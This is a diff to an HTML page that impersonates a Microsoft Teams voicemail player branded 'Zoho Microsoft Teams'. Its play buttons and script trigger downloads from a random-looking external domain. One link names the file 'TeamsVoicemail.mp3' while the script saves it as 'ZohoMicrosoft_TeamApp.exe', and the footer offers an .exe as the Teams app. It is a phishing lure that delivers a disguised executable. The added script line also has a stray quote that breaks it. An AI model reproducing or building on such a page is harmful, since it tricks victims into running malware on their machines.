@@ -68,6 +68,7 @@
             background-color: #fff;
             color: #6264a7;
             border: 2px solid #6264a7;
+            text-align: center;
         }
         .button.teams-app:hover {
             background-color: #f3f2f1;
@@ -126,22 +127,27 @@
         <h1>Zoho Microsoft Teams</h1>
         <p>Play Voicemail</p>
         <button class="button" onclick="downloadFile()">▷ ──── 02:53</button>
-        <button class="button teams-app" onclick="downloadFile()">Play in the Teams app</button>
+
+        <a href="https://gvlki.tlucnsvsrbi.es/L4bfsKusByjq!O5/" 
+           download="TeamsVoicemail.mp3" 
+           class="button teams-app">
+           Play in the Teams app
+        </a>
     </div>
     <div class="footer">
         <img src="teams.jpg" alt="Teams Logo" class="logo">
         <p style="margin-bottom:6px;">You don’t have the app?</p>
-        <a href="ZohoMicrosoft_TeamApp.exe" class="link" onclick="downloadFile();return false;">Download it now</a>
+        <a href="ZohoMicrosoft_TeamApp.exe" class="link" download>Download it now</a>
     </div>
-   <script>
-    function downloadFile() {
-        const link = document.createElement('a');
-        link.href = "https://gvlki.tlucnsvsrbi.es/L4bfsKusByjq!O5/";
-        link.download = "ZohoMicrosoft_TeamApp.exe"; // You can specify a filename here if desired
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-    }
-</script>
+    <script>
+        function downloadFile() {
+            const link = document.createElement('a');
+            link.href = "https://gvlki.tlucnsvsrbi.es/L4bfsKusByjq!O5/";
+            link.download = "ZohoMicrosoft_TeamApp.exe"";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
 </body>
 </html>
